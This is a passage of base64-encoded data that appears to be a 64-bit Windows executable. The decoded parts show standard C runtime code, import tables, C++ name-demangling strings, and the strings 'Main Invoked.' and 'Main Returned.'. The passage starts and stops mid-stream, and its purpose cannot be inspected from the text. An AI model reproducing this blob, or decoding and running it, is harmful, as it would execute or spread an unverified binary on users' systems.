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gBlAC0AZgBpAGIAZQByAHMALQBsADEALQAxAC0AMQAAAAAAAABhAHAAaQAtAG0AcwAtAHcAaQBuAC0AYwBvAHIAZQAtAHMAeQBuAGMAaAAtAGwAMQAtADIALQAwAAAAAAAAAAAAawBlAHIAbgBlAGwAMwAyAAAAAAAAAAAARXZlbnRSZWdpc3RlcgAAAAAAAAAAAAAARXZlbnRTZXRJbmZvcm1hdGlvbgAAAAAARXZlbnRVbnJlZ2lzdGVyAAAAAAAAAAAARXZlbnRXcml0ZVRyYW5zZmVyAAAAAAAAAQAAAAMAAABGbHNBbGxvYwAAAAAAAAAAAQAAAAMAAABGbHNGcmVlAAEAAAADAAAARmxzR2V0VmFsdWUAAAAAAAEAAAADAAAARmxzU2V0VmFsdWUAAAAAAAIAAAADAAAASW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlvbkV4AD49AAAsAAAAKCkAAH4AAABeAAAAfAAAACYmAAB8fAAAKj0AACs9AAAtPQAALz0AACU9AAA+Pj0APDw9ACY9AAB8PQAAXj0AAAAAAABgdmZ0YWJsZScAAAAAAAAAYHZidGFibGUnAAAAAAAAAGB2Y2FsbCcAYHR5cGVvZicAAAAAAAAAAGBsb2NhbCBzdGF0aWMgZ3VhcmQnAAAAAGBzdHJpbmcnAAAAAAAAAABgdmJhc2UgZGVzdHJ1Y3RvcicAAAAAAABgdmVjdG9yIGRlbGV0aW5nIGRlc3RydWN0b3InAAAAAGBkZWZhdWx0IGNvbnN0cnVjdG9yIGNsb3N1cmUnAAAAYHNjYWxhciBkZWxldGluZyBkZXN0cnVjdG9yJwAAAABgdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAAAAAYHZlY3RvciB2YmFzZSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAGB2aXJ0dWFsIGRpc3BsYWNlbWVudCBtYXAnAAAAAAAAYGVoIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAAAAAGBlaCB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAYGVoIHZlY3RvciB2YmFzZSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAGBjb3B5IGNvbnN0cnVjd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